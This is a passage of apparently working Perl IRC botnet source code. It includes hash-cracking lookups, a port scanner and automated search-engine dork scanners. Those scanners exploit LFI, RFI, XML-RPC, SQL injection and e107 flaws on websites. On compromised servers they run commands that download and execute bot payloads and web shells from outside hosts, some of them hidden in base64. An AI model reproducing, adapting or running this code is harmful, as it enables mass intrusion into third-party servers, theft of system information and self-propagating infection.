		my ($md5,$sha1,$base64) = ($1,$2,$3);
		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@2Encrypt15)12 MD5    :4 ".$teks." 12->3 ".$md5);
		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@2Encrypt15)12 Sha1   :4 ".$teks." 12->3 ".$sha1);
		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@2Encrypt15)12 Base64 :4 ".$teks." 12->3 ".$base64);
	    }
    }
    else { 
	    sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@2Encrypt15)12 Cannot open c0li.m0de.0n"); }
}
exit;
}

sub decrypt() {
##################################################################### PassCracking.Com Hash Engine - Hash 2 Text
if ($msg=~ /PRIVMSG $channel :$decrypt\s+(.*)/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $hash    = $1;
sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@2Decrypt15)12 Trying to Crack7 ".$hash." 12...");
my $cracker = "http://passcracking.com/index.php";
my ($useragent,$request,$response,%form);
undef %form;
$form{datafromuser} = $hash;
$useragent = LWP::UserAgent->new;
$useragent->timeout(10);
$request   = POST $cracker,\%form;
$response  = $useragent->request($request);
if ($response->is_success) {
    my $res = $response->content;
    if ($res =~ m/([0-9])<\/td><td>(.*)<\/td><td>$hash<\/td><td bgcolor=#FF0000>(.*)<\/td><td>(.*)<\/td><\/tr><tr align=center onMouseOver=/g) {
        my ($type,$result) = ($2,$3);
        sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@2Decrypt)12 [$type]4 ".$hash." 12->3 ".$result);
    }
    elsif ($res =~ m/([0-9])<\/td><td>(.*)<\/td><td>$hash<\/td><td bgcolor=#FF0000>(.*)<\/td><td>/g) {
        my ($type,$result) = ($2,$3);
        sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@2Decrypt15)12 [$type]4 ".$hash." 12->3 ".$result);
    }
    elsif ($res =~ m/([0-9])<\/td\><td>(.*)<\/td><td>$hash<\/td><td >[ not found ]/g) {
        my $type = $2;
        sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@2Decrypt15)12 [PassCracking]7 [$type]4 ".$hash." 12not found.");
    }
    elsif ($res =~ m/Thanks for NEW pass/g) {
        sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@2Decrypt15)12 [PassCracking]7 ".$hash." 12is unknown hash.");
    }
	else {
        sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@2Decrypt15)12 [PassCracking]7 ".$hash." 12not found.");
    }
}
else { sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@2Decrypt15)12 Cannot open PassCracking.cOm"); }
}
exit;
}}

##################################################################### GDataOnline.com MD5 Engine - Md5 2 Text
if ($msg=~ /PRIVMSG $channel :$decrypt\s+([0-9,a-f]{32})/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $hash      = $1;
my $cracker   = "http://www.gdataonline.com/qkhash.php?mode=txt&hash=".$hash;
my $request   = HTTP::Request->new(GET=>$cracker);
my $useragent = LWP::UserAgent->new();
$useragent->timeout(10);
my $response  = $useragent->request($request);
if ($response->is_success) {
	my $res  = $response->content;
	if ($res =~ m/>$hash<\/td><td width="35%"><b>(.*)<\/b>/g) {
		my $result = $1;
		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@2Decrypt15)12 [GDataOnline]4 ".$hash." 12->3 ".$result);
	}
	else { sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@2Decrypt15)12 [GDataOnline]4 ".$hash." 12not found."); }
}
else { sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@2Decrypt15)12 Cannot open GDataOnline.cOm"); }
}
exit;
}}

##################################################################### md5.rednoize.com MD5 Engine - Md5 2 Text
if ($msg=~ /PRIVMSG $channel :$decrypt\s+([0-9,a-f]{32})/ ) {
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $hash      = $1;
my $cracker   = "http://md5.rednoize.com/?s=md5&q=".$hash;
my $request   = HTTP::Request->new(GET=>$cracker);
my $useragent = LWP::UserAgent->new();
$useragent->timeout(10);
my $response  = $useragent->request($request);
if ($response->is_success) {
	my $res  = $response->content;
	if ($res =~ m/<div id=\"result\" >(.*)<\/div>/g) {
		my $result = $1;
		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@2Decrypt15)12 [RedNoize]4 ".$hash." 12->3 ".$result);
	}
	else {
		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@2Decrypt15)12 [RedNoize]4 ".$hash." 12not found.");
	}
}
else { sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@2Decrypt15)12 Cannot open Md5.RedNoize.cOm"); }
}
exit;
}}
}

##################################################################### Full Port Scanner
if ($msg=~ /PRIVMSG $channel :$fullport\s+(.*)\s+(\d+)\s+(\d+)/) {
	if (my $pid = fork) {
	waitpid($pid, 0);
	} else {
	if (fork) {
	exit;
	} else {
	my $hostname  = "$1";
	my $startport = "$2";
	my $endport   = "$3";
	my (@portfound, %port_banner);
	sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@2nmap15)12 Scanning4 $hostname [$startport..$endport] 12for open port(s)...");
	foreach my $port ($startport..$endport) {
		my $scansock = IO::Socket::INET->new(PeerAddr => $hostname, PeerPort => $port, Proto => 'tcp', Timeout => 4);
		if ($scansock) {
			push (@portfound, $port);
			$scansock->close;
		}
	}
	if (@portfound) {
		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@2nmap15)4 $hostname 12Open Port(s):4 @portfound");
	} else {
		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@2nmap15)4 $hostname: 12No open ports found.");
	}
}
exit;
}}

sub cmdlfi() {
my $browser = LWP::UserAgent->new;
my $url = $_[0];
my $cmd = $_[1];
my $hie = "j13mbut<?system(\"$cmd 2> /dev/stdout\"); ?>j13mbut";
$browser->agent("$hie");
$browser->timeout(3);
$response = $browser->get( $url );
if ($response->content =~ /j13mbut(.*)j13mbut/s) {
print $1;
sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3LFICMD15)4 $1");
}
}

sub lfiscan() {
    my $engz = $_[0];
    my $bugz = $_[1];
    my $dork = $_[2];
    my $contatore = 0;    
    if ($engz =~ /google/) {
        my @lfigoogle=&google($dork);
        push(@lfitotal, @lfigoogle);
        }
    if ($engz =~ /alltheweb/) {
        my @lfialltheweb=&alltheweb($dork);
        push(@lfitotal, @lfialltheweb);
    }
    if ($engz =~ /Bing/) {
        my @lfiBing=&Bing($dork);
        push(@lfitotal, @lfiBing);
    }
    if ($engz =~ /Virgillio/) {
        my @lfiVirgillIo=&Virgillio($dork);
        push(@lfitotal, @lfiVirgillio);
    }
    if ($engz =~ /altavista/) {
        my @lfialtavista=&altavista($dork);
        push(@lfitotal, @lfialtavista);
    }
    if ($engz =~ /AsK/) {
        my @lfiask=&ask($dork);
        push(@lfitotal, @lfiask);
    }
    if ($engz =~ /UoL/) {
        my @lfiuol=&uol($dork);
        push(@lfitotal, @lfiuol);
    }
    if ($engz =~ /YahOo/) {
        my @lfiyahoo=&yahoo($dork);
        push(@lfitotal, @lfiyahoo);
    }
    if ($engz =~ /naver/) {
        my @lfinaver=&naver($dork);
        push(@lfitotal, @lfinaver);
    }
    if ($engz =~ /onet/) {
        my @lfionet=&onet($dork);
        push(@lfitotal, @lfionet);
    }
    if ($engz =~ /sapo/) {
        my @lfisapo=&sapo($dork);
        push(@lfitotal, @lfisapo);
    }
    if ($engz =~ /search/) {
        my @lfisearch=&search($dork);
        push(@lfitotal, @lfisearch);
    }
    if ($engz =~ /msn/) {
        my @lfimsn=&msn($dork);
        push(@lfitotal, @lfimsn);
    }
    if ($engz =~ /lycos/) {
        my @lfilycos=&lycos($dork);
        push(@lfitotal, @lfilycos);
    }
    if ($engz =~ /snz/) {
        my @lfisnz=&snz($dork);
        push(@lfitotal, @lfisnz);
    }
    if ($engz =~ /witch/) {
        my @lfiwitch=&witch($dork);
        push(@lfitotal, @lfiwitch);
    }
    if ($engz =~ /seznam/) {
        my @lfiseznam=&seznam($dork);
        push(@lfitotal, @lfiseznam);
    }
    if ($engz =~ /szukacz/) {
        my @lfiszukacz=&szukacz($dork);
        push(@lfitotal, @lfiszukacz);
    }
    if ($engz =~ /google2/) {
        my @lfigoogle2=&gsuper($dork);
        push(@lfitotal, @lfigoogle2);
    }
    if ($engz =~ /goodsearch/) {
        my @lfigoodsearch=&goodsearch($dork);
        push(@lfitotal, @lfigoodsearch);
    }
    if ($engz =~ /hotbot/) {
        my @lfihotbot=&hotbot($dork);
        push(@lfitotal, @lfihotbot);
    }
    if ($engz =~ /aol/) {
        my @lfiaol=&aol($dork);
        push(@lfitotal, @lfiaol);
    }
    my @lficlean = &calculate(@lfitotal);
    if (scalar(@lficlean) != 0) {
    }
    my $uni=scalar(@lficlean);
    foreach my $lfitarget (@lficlean)
    {
        $contatore++;
        if ($contatore==$uni-1){
            sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4LFI2][9@4$engz2][ 14$dork Finish 2]");
        }
	my $rspo_test   = "../../../../../../../../../../../../../../../proc/self/environ%00";
	my $rspo_shell   = "http://hbbb.com.au/.../mysh.jpg?";
        my $lfi  = "../../../../../../../../../../../../../../..";
        my $xpl  = "http://".$lfitarget.$bugz.$rspo_test;
        my $vuln = "http://".$lfitarget."12".$bugz."7".$rspo_test."";
        my $re   = getcontent($xpl);
        if ($re  =~ /DOCUMENT_ROOT=\// && $re =~ /HTTP_USER_AGENT/){
            if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
                my $rspo = lfiexploit($xpl,"uname -svnrp;echo J13mb0T;id");
                $rspo =~ s/\n//g;
                if ($rspo =~ /j13mb0t#(.*)J13mb0Tuid=(.*)#j13mb0t/sg) {
                    my ($sys,$uid) = ($1,$2);
		    my $lfispread	= "cd /tmp;wget ".$perl." -O php.jpg;perl php.jpg;rm -rf *.jpg*;wget ".$php." -O pbot.txt;php pbot.txt;rm -rf pbot.txt*";
                    my $tmp = "/tmp/cmd".int rand(2010);
                    my $upload = lfiexploit($xpl,"wget $rspo_shell -O $tmp;$lfispread"); sleep(1);
                    my $res = getcontent("http://".$lfitarget.$bugz.$lfi.$tmp.'%00');
                    if ($res =~ /bjork/) {
                        sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4LFI2][9@4$engz2][9@4PHPSheLL2][ 13http://".$lfitarget."12".$bugz."6".$lfi."7".$tmp."%00 2][7@3".$sys."2]2");
                    }
                    else {
                        sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4LFI2][9@4$engz2][9@4System2][13 http://".$lfitarget."12".$bugz."6[LFI] 2[4@3".$sys." 7uid=".$uid."2]2");
                    }
                }
                else {
                    sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4LFI2][9@4$engz2][9@4Vuln2][13 ".$vuln." 2]");
                }
            } exit } sleep(3);
        }
    }
}

sub cmdxml() {
my $jed = $_[0];
my $dwa = $_[1];
my $userAgent = LWP::UserAgent->new(agent => 'perl post');
        $exploit = "<?xml version=\"1.0\"?><methodCall>";
        $exploit .= "<methodName>test.method</methodName>";
        $exploit .= "<params><param><value><name>',''));";
        $exploit .= "echo'bamby';echo`".$dwa."`;echo'solo';exit;/*</name></value></param></params></methodCall>";
my $response = $userAgent->request(POST $jed,Content_Type => 'text/xml',Content => $exploit);
if ($response->content =~ /bamby(.*)solo/s) {
sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4XMLCMD2][14 $1");
}
}

sub xmlscan() {
    my $engz = $_[0];
    my $bugz = $_[1];
    my $dork = $_[2];
    my $contatore = 0;    
    if ($engz =~ /google/) {
        my @xmlgoogle=&google($dork);
        push(@xmltotal, @xmlgoogle);
        }
    if ($engz =~ /alltheweb/) {
        my @xmlalltheweb=&alltheweb($dork);
        push(@xmltotal, @xmlalltheweb);
    }
    if ($engz =~ /Bing/) {
        my @xmlBing=&Bing($dork);
        push(@xmltotal, @xmlBing);
    }
    if ($engz =~ /Virgillio/) {
        my @xmlVirgillio=&Virgillio($dork);
        push(@xmltotal, @xmlVirgillio);
    }
    if ($engz =~ /altavista/) {
        my @xmlaltavista=&altavista($dork);
        push(@xmltotal, @xmlaltavista);
    }
    if ($engz =~ /AsK/) {
        my @xmlask=&ask($dork);
        push(@xmltotal, @xmlask);
    }
    if ($engz =~ /UoL/) {
        my @xmluol=&uol($dork);
        push(@xmltotal, @xmluol);
    }
    if ($engz =~ /YahOo/) {
        my @xmlyahoo=&yahoo($dork);
        push(@xmltotal, @xmlyahoo);
    }
    if ($engz =~ /naver/) {
        my @xmlnaver=&naver($dork);
        push(@xmltotal, @xmlnaver);
    }
    if ($engz =~ /onet/) {
        my @xmlonet=&onet($dork);
        push(@xmltotal, @xmlonet);
    }
    if ($engz =~ /sapo/) {
        my @xmlsapo=&sapo($dork);
        push(@xmltotal, @xmlsapo);
    }
    if ($engz =~ /search/) {
        my @xmlsearch=&search($dork);
        push(@xmltotal, @xmlsearch);
    }
    if ($engz =~ /msn/) {
        my @xmlmsn=&msn($dork);
        push(@xmltotal, @xmlmsn);
    }
    if ($engz =~ /lycos/) {
        my @xmllycos=&lycos($dork);
        push(@xmltotal, @xmllycos);
    }
    if ($engz =~ /snz/) {
        my @xmlsnz=&snz($dork);
        push(@xmltotal, @xmlsnz);
    }
    if ($engz =~ /witch/) {
        my @xmlwitch=&witch($dork);
        push(@xmltotal, @xmlwitch);
    }
    if ($engz =~ /seznam/) {
        my @xmlseznam=&seznam($dork);
        push(@xmltotal, @xmlseznam);
    }
    if ($engz =~ /szukacz/) {
        my @xmlszukacz=&szukacz($dork);
        push(@xmltotal, @xmlszukacz);
    }
    if ($engz =~ /google2/) {
        my @xmlgoogle2=&gsuper($dork);
        push(@xmltotal, @xmlgoogle2);
    }
    if ($engz =~ /goodsearch/) {
        my @xmlgoodsearch=&goodsearch($dork);
        push(@xmltotal, @xmlgoodsearch);
    }
    if ($engz =~ /hotbot/) {
        my @xmlhotbot=&hotbot($dork);
        push(@xmltotal, @xmlhotbot);
    }
    if ($engz =~ /aol/) {
        my @xmlaol=&aol($dork);
        push(@xmltotal, @xmlaol);
    }
    my @xmlclean = &calculate(@xmltotal);
    if (scalar(@xmlclean) != 0) {
    }
    my $uni=scalar(@xmlclean);
    foreach my $xmltarget (@xmlclean)
    {
        $contatore++;
        if ($contatore==$uni-1){
            sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4XML2][9@4$engz2][ 14$dork Finish 2]");
        }
        my $xpl = "http://".$xmltarget.$bugz;
	    my $xmlsprd = "cd /tmp;wget ".$perl." -O php.jpg;perl php.jpg;rm -rf *.jpg*;wget ".$php." -O pbot.txt;php pbot.txt;rm -rf pbot.txt*";
        my $strona = getcontent($xpl);
        if ( $strona =~ /faultCode/ ) {
			xmlcek($xpl);
			xmlxspread($xpl,$xmlsprd);
                        sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4XML2][9@4$engz2][ 13$xpl 2]9 $os ");
			}
	}
}

sub rfiscan() {
    my $engz = $_[0];
    my $bugz = $_[1];
    my $dork = $_[2];
    my $contatore = 0;    
    if ($engz =~ /google/) {
        my @rfigoogle=&google($dork);
        push(@rfitotal, @rfigoogle);
        }
    if ($engz =~ /alltheweb/) {
        my @rfialltheweb=&alltheweb($dork);
        push(@rfitotal, @rfialltheweb);
    }
    if ($engz =~ /Bing/) {
        my @rfiBing=&Bing($dork);
        push(@rfitotal, @rfiBing);
    }
    if ($engz =~ /Virgillio/) {
        my @rfiVirgillio=&Virgillio($dork);
        push(@rfitotal, @rfiVirgillio);
    }
    if ($engz =~ /altavista/) {
        my @rfialtavista=&altavista($dork);
        push(@rfitotal, @rfialtavista);
    }
    if ($engz =~ /AsK/) {
        my @rfiask=&ask($dork);
        push(@rfitotal, @rfiask);
    }
    if ($engz =~ /UoL/) {
        my @rfiuol=&uol($dork);
        push(@rfitotal, @rfiuol);
    }
    if ($engz =~ /YahOo/) {
        my @rfiyahoo=&yahoo($dork);
        push(@rfitotal, @rfiyahoo);
    }
    if ($engz =~ /naver/) {
        my @rfinaver=&naver($dork);
        push(@rfitotal, @rfinaver);
    }
    if ($engz =~ /onet/) {
        my @rfionet=&onet($dork);
        push(@rfitotal, @rfionet);
    }
    if ($engz =~ /sapo/) {
        my @rfisapo=&sapo($dork);
        push(@rfitotal, @rfisapo);
    }
    if ($engz =~ /search/) {
        my @rfisearch=&search($dork);
        push(@rfitotal, @rfisearch);
    }
    if ($engz =~ /msn/) {
        my @rfimsn=&msn($dork);
        push(@rfitotal, @rfimsn);
    }
    if ($engz =~ /lycos/) {
        my @rfilycos=&lycos($dork);
        push(@rfitotal, @rfilycos);
    }
    if ($engz =~ /snz/) {
        my @rfisnz=&snz($dork);
        push(@rfitotal, @rfisnz);
    }
    if ($engz =~ /witch/) {
        my @rfiwitch=&witch($dork);
        push(@rfitotal, @rfiwitch);
    }
    if ($engz =~ /seznam/) {
        my @rfiseznam=&seznam($dork);
        push(@rfitotal, @rfiseznam);
    }
    if ($engz =~ /szukacz/) {
        my @rfiszukacz=&szukacz($dork);
        push(@rfitotal, @rfiszukacz);
    }
    if ($engz =~ /google2/) {
        my @rfigoogle2=&gsuper($dork);
        push(@rfitotal, @rfigoogle2);
    }
    if ($engz =~ /hotbot/) {
        my @rfihotbot=&hotbot($dork);
        push(@rfitotal, @rfihotbot);
    }
    if ($engz =~ /goodsearch/) {
        my @rfigoodsearch=&goodsearch($dork);
        push(@rfitotal, @rfigoodsearch);
    }
    if ($engz =~ /aol/) {
        my @rfiaol=&aol($dork);
        push(@rfitotal, @rfiaol);
    }
    my @rficlean = &calculate(@rfitotal);
    if (scalar(@rficlean) != 0) {
    }
    my $uni=scalar(@rficlean);
    foreach my $rfitarget (@rficlean)
    {
        $contatore++;
        if ($contatore==$uni-1){
            sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4RFI2][9@4$engz2][ 14$dork Finish 2]");
        }
        my $rfixpl  = "http://".$rfitarget.$bugz.$rfiid;
	    my $inj	    = "http://".$rfitarget."12".$bugz."14".$shell."?";
	    my $rfispd  = "http://".$rfitarget.$bugz.$php."?";
        my $re   = getcontent($rfixpl);
        if ($re  =~ /BaMbY/){
			getcontent($rfispd);
			os($rfixpl);
			sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4RFI2][9@4$engz2][ 13$inj 2] 9$os");
			}
	}
}

sub sqlscan() {
    my $engz = $_[0];
    my $bugz = $_[1];
    my $dork = $_[2];
    my $contatore = 0;    
    if ($engz =~ /google/) {
        my @sqlgoogle=&google($dork);
        push(@sqltotal, @sqlgoogle);
        }
    if ($engz =~ /alltheweb/) {
        my @sqlalltheweb=&alltheweb($dork);
        push(@sqltotal, @sqlalltheweb);
    }
    if ($engz =~ /Bing/) {
        my @sqlBing=&Bing($dork);
        push(@sqltotal, @sqlBing);
    }
    if ($engz =~ /Virgillio/) {
        my @sqlVirgillio=&Virgillio($dork);
        push(@sqltotal, @sqlVirgillio);
    }
    if ($engz =~ /altavista/) {
        my @sqlaltavista=&altavista($dork);
        push(@sqltotal, @sqlaltavista);
    }
    if ($engz =~ /AsK/) {
        my @sqlask=&ask($dork);
        push(@sqltotal, @sqlask);
    }
    if ($engz =~ /UoL/) {
        my @sqluol=&uol($dork);
        push(@sqltotal, @sqluol);
    }
    if ($engz =~ /YahOo/) {
        my @sqlyahoo=&yahoo($dork);
        push(@sqltotal, @sqlyahoo);
    }
    if ($engz =~ /naver/) {
        my @sqlnaver=&naver($dork);
        push(@sqltotal, @sqlnaver);
    }
    if ($engz =~ /onet/) {
        my @sqlonet=&onet($dork);
        push(@sqltotal, @sqlonet);
    }
    if ($engz =~ /sapo/) {
        my @sqlsapo=&sapo($dork);
        push(@sqltotal, @sqlsapo);
    }
    if ($engz =~ /search/) {
        my @sqlsearch=&search($dork);
        push(@sqltotal, @sqlsearch);
    }
    if ($engz =~ /msn/) {
        my @sqlmsn=&msn($dork);
        push(@sqltotal, @sqlmsn);
    }
    if ($engz =~ /lycos/) {
        my @sqllycos=&lycos($dork);
        push(@sqltotal, @sqllycos);
    }
    if ($engz =~ /snz/) {
        my @sqlsnz=&snz($dork);
        push(@sqltotal, @sqlsnz);
    }
    if ($engz =~ /witch/) {
        my @sqlwitch=&witch($dork);
        push(@sqltotal, @sqlwitch);
    }
    if ($engz =~ /seznam/) {
        my @sqlseznam=&seznam($dork);
        push(@sqltotal, @sqlseznam);
    }
    if ($engz =~ /szukacz/) {
        my @sqlszukacz=&szukacz($dork);
        push(@sqltotal, @sqlszukacz);
    }
    if ($engz =~ /goodsearch/) {
        my @sqlgoodsearch=&goodsearch($dork);
        push(@sqltotal, @sqlgoodsearch);
    }
    if ($engz =~ /google2/) {
        my @sqlgoogle2=&gsuper($dork);
        push(@sqltotal, @sqlgoogle2);
    }
    if ($engz =~ /hotbot/) {
        my @sqlhotbot=&hotbot($dork);
        push(@sqltotal, @sqlhotbot);
    }
    if ($engz =~ /aol/) {
        my @sqlaol=&aol($dork);
        push(@sqltotal, @sqlaol);
    }
    my @sqlclean = &calculate(@sqltotal);
    if (scalar(@sqlclean) != 0) {
    }
    my $uni=scalar(@sqlclean);
    foreach my $sqltarget (@sqlclean)
    {
        $contatore++;
        if ($contatore==$uni-1){
        sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4SQL2][9@4$engz2][ 14$dork Finish 2]");
        }
        my $xpl = "http://".$sqltarget.$bugz."'";
		my $vuln = "http://".$sqltarget."12".$bugz."2]";
		my $sqlsite = "http://".$sqltarget.$bugz;
        my $strona = getcontent($xpl);
        if ($strona=~ m/You have an error in your SQL syntax/i || $strona=~ m/Query failed/i || $strona=~ m/SQL query failed/i || $strona=~ m/mysql_fetch_/i || $strona=~ m/mysql_fetch_array/i || $strona =~ m/mysql_num_rows/i || $strona =~ m/The used SELECT statements have a different number of columns/i ){
		    &mysqlexplo($sqlsite,$engz);
	    }
		elsif ( $strona =~ m/ODBC SQL Server Driver/i || $strona =~ m/Unclosed quotation mark/i || $strona =~ m/Microsoft OLE DB Provider for/i ){
		{sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4SQL2][9@4$engz2][13 $vuln ");}
		}
		elsif ( $strona =~ m/Microsoft JET Database/i || $strona =~ m/ODBC Microsoft Access Driver/i ){
		{sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4SQL2][9@4$engz2][13 $vuln ");}
		}
	}
}

sub mysqlexplo(){
    my $sqlsite=$_[0];
	my $engz=$_[1];
    my $columns = 70;
    my $cfin.="--";
    my $cmn.= "+";
    for ($column = 0 ; $column < $columns ; $column ++){
         $union.=','.$column;
         $inyection.=','."0x4279726f654e6574";
        if ($column == 0){
            $inyection = '';
            $union = '';
        }
         $urlsql=$sqlsite."-1".$cmn."union".$cmn."select".$cmn."0x4279726f654e6574".$inyection.$cfin;
         $response=query($urlsql);
        if($response =~ /ByroeNet/){
            $column ++;
            $tampilsql=$sqlsite."-1".$cmn."union".$cmn."select".$cmn."0".$union.$cfin;
            $infosql=$sqlsite."-1".$cmn."union".$cmn."select".$cmn."CONCAT_WS(0x3a,0x4279726f654e6574,database(),user(),version(),@@version_compile_os,0x42614d6259)".$inyection.$cmn."from".$cmn."information_schema.tables".$cfin;
            $inforpns=query($infosql);
            if($inforpns =~ /ByroeNet:(.+?):(.+?):(.+?):(.+?)/i){
               my ($db_name,$db_usr,$db_ver,$db_os) = ($1,$2,$3,$4);
               $myinfosql = "2[9@4Info2][4DB Name2][14 $db_name 2[4User2][14 $db_usr 2[4Version2][14 $db_ver ";
            }
        sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4MySQL2][9@4$engz2][14 $tampilsql $myinfosql ");
        }
    }
}

sub cmde107() {
my $path = $_[0];
my $incmd = $_[1];
my $codecmd = encode_base64($incmd);
my $cmd = 'echo(base64_decode("QmFNYlk=").shell_exec(base64_decode("aWQ=")).base64_decode("Qnlyb2VOZXQ=")).shell_exec(base64_decode("'.$codecmd.'"))';print $cmd;
$access = new LWP::UserAgent;
$access->agent("Mozilla/5.0");
my $req = new HTTP::Request POST => $path;
   $req->content_type('application/x-www-form-urlencoded');
   $req->content("send-contactus=1&author_name=%5Bphp%5D".$cmd."%3Bdie%28%29%3B%5B%2Fphp%5D");
my $res = $access->request($req);
my $data = $res->as_string;
if ( $data =~ /ByroeNet(.*)/ ){
     $mydata = $1;
sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4e107CMD2][3 $mydata2 ]");
}
}
sub e107scan() {
    my $engz = $_[0];
    my $bugz = $_[1];
    my $dork = $_[2];
    my $contatore = 0;    
    if ($engz =~ /google/) {
        my @e107google=&google($dork);
        push(@e107total, @e107google);
        }
    if ($engz =~ /alltheweb/) {
        my @e107alltheweb=&alltheweb($dork);
        push(@e107total, @e107alltheweb);
    }
    if ($engz =~ /Bing/) {
        my @e107Bing=&Bing($dork);
        push(@e107total, @e107Bing);
    }
    if ($engz =~ /Virgillio/) {
        my @e107Virgillio=&Virgillio($dork);
        push(@e107total, @e107Virgillio);
    }
    if ($engz =~ /altavista/) {
        my @e107altavista=&altavista($dork);
        push(@e107total, @e107altavista);
    }
    if ($engz =~ /AsK/) {
        my @e107ask=&ask($dork);
        push(@e107total, @e107ask);
    }
    if ($engz =~ /UoL/) {
        my @e107uol=&uol($dork);
        push(@e107total, @e107uol);
    }
    if ($engz =~ /YahOo/) {
        my @e107yahoo=&yahoo($dork);
        push(@e107total, @e107yahoo);
    }
    if ($engz =~ /naver/) {
        my @e107naver=&naver($dork);
        push(@e107total, @e107naver);
    }
    if ($engz =~ /onet/) {
        my @e107onet=&onet($dork);
        push(@e107total, @e107onet);
    }
    if ($engz =~ /sapo/) {
        my @e107sapo=&sapo($dork);
        push(@e107total, @e107sapo);
    }
    if ($engz =~ /search/) {
        my @e107search=&search($dork);
        push(@e107total, @e107search);
    }
    if ($engz =~ /msn/) {
        my @e107msn=&msn($dork);
        push(@e107total, @e107msn);
    }
    if ($engz =~ /lycos/) {
        my @e107lycos=&lycos($dork);
        push(@e107total, @e107lycos);
    }
    if ($engz =~ /snz/) {
        my @e107snz=&snz($dork);
        push(@e107total, @e107snz);
    }
    if ($engz =~ /witch/) {
        my @e107witch=&witch($dork);
        push(@e107total, @e107witch);
    }
    if ($engz =~ /seznam/) {
        my @e107seznam=&seznam($dork);
        push(@e107total, @e107seznam);
    }
    if ($engz =~ /szukacz/) {
        my @e107szukacz=&szukacz($dork);
        push(@e107total, @e107szukacz);
    }
    if ($engz =~ /Google2/) {
        my @e107google2=&gsuper($dork);
        push(@e107total, @e107google2);
    }
    if ($engz =~ /GoodSearch/) {
        my @e107goodsearch=&goodsearch($dork);
        push(@e107total, @e107goodsearch);
    }
    if ($engz =~ /hotbot/) {
        my @e107hotbot=&hotbot($dork);
        push(@e107total, @e107hotbot);
    }
    if ($engz =~ /aol/) {
        my @e107aol=&aol($dork);
        push(@e107total, @e107aol);
    }
    my @e107clean = &calculate(@e107total);
    if (scalar(@e107clean) != 0) {
    }
    my $uni=scalar(@e107clean);
    foreach my $e107target (@e107clean)
    {
        $contatore++;
        if ($contatore==$uni-1){
            sendraw($IRC_cur_socket, "PRIVMSG $channel :2[9@4e1072][9@4$engz2][ 14$dork Finish 2]");
        }
		my $cmd = "echo(base64_decode(\"Vm9v\").php_uname().base64_decode(\"RG9v\"));include(base64_decode(\"aHR0cDovL3N0cmVhbWxpbmVpbnRlcmFjdGl2ZS5jb20vLi4uL3AudHh0Pw==\"));include(base64_decode(\"aHR0cDovL3N0cmVhbWxpbmVpbnRlcmFjdGl2ZS5jb20vLi4uL3NwcmVhZC5sb2c/\"));";
		my $ua = LWP::UserAgent->new or die;
		$ua->agent('Microsoft Internet Explorer/4.0b1 (Windows 95)','Mozilla/1.22 (compatible; MSIE 1.5; Windows NT)','Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)','Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)','Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.9 sun4u; X11)','Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)','Mozilla/4.0 (compatible; MSIE 5.23; Mac_PowerPC)','Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)','Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322)','Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)','Mozilla/4.0 (compatible; MSIE 7.0b; Win32)','Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)','Microsoft Pocket Internet Explorer/0.6','Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)','MOT-MPx220/1.400 Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Smartphone;','Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.1; Windows NT 5.1;)','Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)','Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)','Advanced Browser (http://www.avantbrowser.com)','Avant 